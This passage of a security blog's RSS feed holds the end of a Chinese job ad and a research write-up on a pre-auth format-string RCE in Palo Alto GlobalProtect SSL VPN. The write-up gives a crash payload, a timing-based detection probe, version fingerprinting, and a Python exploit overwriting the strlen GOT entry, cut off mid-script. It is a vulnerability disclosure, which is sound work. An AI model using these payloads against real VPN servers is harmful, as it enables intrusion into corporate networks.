      &lt;li&gt;差旅行程，例如：交通票券訂購、簽證辦理&lt;/li&gt;
      &lt;li&gt;教育訓練安排&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;其他主管交辦事項 10%&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作時間&quot;&gt;工作時間&lt;/h3&gt;
&lt;p&gt;10:00 - 18:00&lt;/p&gt;

&lt;h3 id=&quot;工作地點&quot;&gt;工作地點&lt;/h3&gt;
&lt;p&gt;台北市中山區復興北路 168 號 10 樓
（捷運南京復興站 8 號出口，走路約 3 分鐘）&lt;/p&gt;

&lt;h3 id=&quot;人格特質偏好&quot;&gt;人格特質偏好&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;細心嚴謹，能耐心的處理繁瑣的庶務工作。&lt;/li&gt;
  &lt;li&gt;主動積極，看到我們沒發現的細節，超越我們所期望的基準。&lt;/li&gt;
  &lt;li&gt;懂得溝通傾聽，能同理他人，找出彼此共識。&lt;/li&gt;
  &lt;li&gt;擅長邏輯思考，懂得透過淺顯易懂且條理清晰的方式傳達自己的想法。&lt;/li&gt;
  &lt;li&gt;良好的時間管理能力，依據任務的優先順序，有效率的完成每項交辦。&lt;/li&gt;
  &lt;li&gt;勇於接受挑戰且具備解決問題的能力，努力克服未知的難題。&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作條件要求&quot;&gt;工作條件要求&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;需有三年以上行政相關工作經驗&lt;/li&gt;
  &lt;li&gt;熟悉 Google Sheets 操作，且具獨立撰寫試算表公式的能力&lt;/li&gt;
  &lt;li&gt;習慣使用雲端服務，如：Google Drive, Dropbox 或其他&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;加分條件&quot;&gt;加分條件&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;您使用過專案管理系統，如：Trello, Basecamp, Redmine 或其他&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您將會使用專案管理系統管理平日任務。&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您是 MAC 使用者&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您未來的電腦會是 MAC，我們希望您越快順暢使用電腦越好。&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;您是生活駭客&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;您不需要會寫程式，但您習慣觀察生活中的規律，並想辦法利用這些規律有效率的解決問題。&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;工作環境&quot;&gt;工作環境&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;您會在一個開闊的辦公環境工作
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;您會擁有一張 Aeron 人體工學椅
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;每週補滿飲料（另有咖啡機）、零食，讓您保持心情愉快
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;公司提供飛鏢機讓您發洩對主管的怨氣
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;公司福利&quot;&gt;公司福利&lt;/h3&gt;
&lt;p&gt;我們注重公司每位同仁的身心健康，請參考以下福利制度：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;休假福利
    &lt;ul&gt;
      &lt;li&gt;到職即可預支當年度特休&lt;/li&gt;
      &lt;li&gt;每年五天全薪病假&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;獎金福利
    &lt;ul&gt;
      &lt;li&gt;三節禮金（春節、端午節、中秋節）&lt;/li&gt;
      &lt;li&gt;生日禮金&lt;/li&gt;
      &lt;li&gt;婚喪補助&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;休閒福利
    &lt;ul&gt;
      &lt;li&gt;員工旅遊&lt;/li&gt;
      &lt;li&gt;舒壓按摩&lt;/li&gt;
      &lt;li&gt;Team Building&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;美食福利
    &lt;ul&gt;
      &lt;li&gt;零食飲料&lt;/li&gt;
      &lt;li&gt;員工聚餐&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;健康福利
    &lt;ul&gt;
      &lt;li&gt;員工健康檢查&lt;/li&gt;
      &lt;li&gt;運動中心健身券&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;進修福利
    &lt;ul&gt;
      &lt;li&gt;內部教育訓練&lt;/li&gt;
      &lt;li&gt;外部進修課程&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;其他
    &lt;ul&gt;
      &lt;li&gt;專業的公司團隊&lt;/li&gt;
      &lt;li&gt;扁平的內部組織&lt;/li&gt;
      &lt;li&gt;順暢的溝通氛圍&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;起薪範圍&quot;&gt;起薪範圍&lt;/h3&gt;
&lt;p&gt;新台幣 34,000 - 40,000 （保證年薪 14 個月）&lt;/p&gt;

&lt;h3 id=&quot;應徵方式&quot;&gt;應徵方式&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;請將您的履歷以 PDF 格式寄到 recruiting@devco.re
    &lt;ul&gt;
      &lt;li&gt;履歷格式請參考範例示意（&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOC&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;、&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;）並轉成 PDF。若您有自信，也可以自由發揮最能呈現您能力的履歷。&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;標題格式：&lt;strong&gt;[應徵] 行政專員 您的姓名&lt;/strong&gt;（範例：[應徵] 行政專員 王小美）&lt;/li&gt;
  &lt;li&gt;履歷內容請務必控制在兩頁以內，至少需包含以下內容：
    &lt;ul&gt;
      &lt;li&gt;基本資料&lt;/li&gt;
      &lt;li&gt;學歷&lt;/li&gt;
      &lt;li&gt;工作經歷&lt;/li&gt;
      &lt;li&gt;社群活動經歷&lt;/li&gt;
      &lt;li&gt;特殊事蹟&lt;/li&gt;
      &lt;li&gt;MBTI 職業性格測試結果（&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;測試網頁&lt;/a&gt;）&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;附註&quot;&gt;附註&lt;/h3&gt;

&lt;p&gt;我們會在兩週內主動與您聯繫，招募過程依序為書面審核、線上測驗以及面試三個階段。最快將於八月中進行第二階段的線上測驗，煩請耐心等候。
由於最近業務較為忙碌，若有應徵相關問題，請一律使用 Email 聯繫，造成您的不便請見諒。&lt;/p&gt;

&lt;p&gt;我們選擇優先在部落格公布徵才資訊，是希望您也對資訊安全議題感興趣，即使不懂技術也想為台灣資安盡一點力。無論如何，我們都感謝您的來信，期待您的加入！&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/07/23/devcore-201907-recruit/</link>
                <guid>https://devco.re/blog/2019/07/23/devcore-201907-recruit</guid>
                <pubDate>Tue, 23 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? They’re exposed to the Internet, trusted to reliably guard the only way to your intranet. Once the SSL VPN server is compromised, attackers can infiltrate your Intranet and even take over all users connecting to the SSL VPN server! Due to its importance, in the past several months, we started a new research on the security of leading SSL VPN products.&lt;/p&gt;

&lt;p&gt;We plan to publish our results on 3 articles. We put this as the first one because we think this is an interesting story and is very suitable as an appetizer of our &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; talk:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt;!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Don’t worry about the spoilers, this story is not included in our BHUSA/DEFCON talks.&lt;/p&gt;

&lt;p&gt;In our incoming presentations, we will provide more hard-core exploitations and crazy bugs chains to hack into your SSL VPN. From how we jailbreak the appliance and what attack vectors we are focusing on. We will also demonstrate gaining root shell from the only exposed HTTPS port, covertly weaponizing the server against their owner, and abusing a hidden feature to take over all VPN clients! So please look forward to it ;)&lt;/p&gt;

&lt;h2 id=&quot;the-story&quot;&gt;The story&lt;/h2&gt;

&lt;p&gt;In this article, we would like to talk about the vulnerability on Palo Alto SSL VPN. Palo Alto calls their SSL VPN product line as GlobalProtect. You can easily identify the GlobalPortect service via the 302 redirection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/global-protect/login.esp&lt;/code&gt; on web root!&lt;/p&gt;

&lt;p&gt;About the vulnerability, we accidentally discovered it during our &lt;a href=&quot;https://devco.re/en/services/red-team/&quot;&gt;Red Team assessment services&lt;/a&gt;.  At first, we thought this is a 0day. However, we failed reproducing on the remote server which is the latest version of GlobalProtect. So we began to suspect if this is a known vulnerability.&lt;/p&gt;

&lt;p&gt;We searched all over the Internet, but we could not find anything. There is no public RCE exploit before[1], no official advisory contains anything similar and no CVE. So we believe this must be a silent-fix 1-day!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] There are some exploit about the  Pan-OS management interface before such as the &lt;a href=&quot;https://www.exploit-db.com/exploits/43342&quot;&gt;CVE-2017-15944&lt;/a&gt; and the excellent &lt;a href=&quot;https://www.troopers.de/events/troopers16/630_attacking_next-generation_firewalls/&quot;&gt;Troppers16 paper&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_fel1x&quot;&gt;@_fel1x&lt;/a&gt;, but unfortunately, they are not talking about the GlobalProtect and the management interface is only exposed to the LAN port&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-bug&quot;&gt;The bug&lt;/h2&gt;

&lt;p&gt;The bug is very straightforward. It is just a simple format string vulnerability with no authentication required! The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; is the SSL gateway handling the SSL handshake between the server and clients. The daemon is exposed by the Nginx reverse proxy and can be touched via the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sslmgr&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://global-protect/sslmgr
&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; ?&amp;gt;
        &amp;lt;clientcert-response&amp;gt;
                &amp;lt;status&amp;gt;error&amp;lt;/status&amp;gt;
                &amp;lt;msg&amp;gt;Invalid parameters&amp;lt;/msg&amp;gt;
        &amp;lt;/clientcert-response&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;During the parameter extraction, the daemon searches the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scep-profile-name&lt;/code&gt; and pass its value as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; format to fill in the buffer. That leads to the format string attack. You can just crash the service with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt;!&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/sslmgr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;global-protect&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;36&lt;/span&gt;

scep-profile-name=%n%n%n%n%n...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;affect-versions&quot;&gt;Affect versions&lt;/h2&gt;

&lt;p&gt;According to our survey, all the GlobalProtect before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;July 2018&lt;/code&gt; are vulnerable! Here is the affect version list:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The series 9.x and 7.0.x are not affected by this vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;how-to-verify-the-bug&quot;&gt;How to verify the bug&lt;/h2&gt;

&lt;p&gt;Although we know where the bug is, to verify the vulnerability is still not easy. There is no output for this format string so that we can’t obtain any address-leak to verify the bug. And to crash the service is never our first choice[1]. In order to avoid crashes, we need to find a way to verify the vulnerability elegantly!&lt;/p&gt;

&lt;p&gt;By reading the &lt;a href=&quot;https://linux.die.net/man/3/snprintf&quot;&gt;snprintf manual&lt;/a&gt;, we choose  the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%c&lt;/code&gt; as our gadget! When there is a number before the format, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%9999999c&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; repeats the corresponding times internally. We observe the response time of large repeat number to verify this vulnerability!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%9999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m1.721s
user    0m0.037s
sys     0m0.005s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%99999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m2.051s
user    0m0.035s
sys     0m0.012s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%999999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m5.324s
user    0m0.021s
sys     0m0.018s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the response time increases along with the number of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%c&lt;/code&gt;. So, from the time difference, we can identify the vulnerable SSL VPN elegantly!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] Although there is a watchdog monitoring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; daemon, it’s still improper to crash a service!&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The exploitation&lt;/h2&gt;

&lt;p&gt;Once we can verify the bug, the exploitation is easy. To exploit the binary successfully, we need to determine the detail version first. We can distinguish by the Last-Modified header, such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/global-protect/portal/css/login.css&lt;/code&gt; from 8.x version and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/images/logo_pan_158.gif&lt;/code&gt; from 7.x version!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; https://sslvpn/global-protect/portal/css/login.css | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Last-Modified
Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With a specified version, we can write our own exploit now. We simply modified the pointer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strlen&lt;/code&gt; on the Global Offset Table(GOT) to the Procedure Linkage Table(PLT) of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;. Here is the PoC:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/sslmgr&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo pwned &amp;gt; /var/appweb/sslvpndocs/hacked.txt&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x667788&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x445566&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&apos;%70$n&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;c&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%32$hn&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;c&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%24$hn&apos;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;$p&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;scep-profile-name=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;host-id=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;user-email=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;
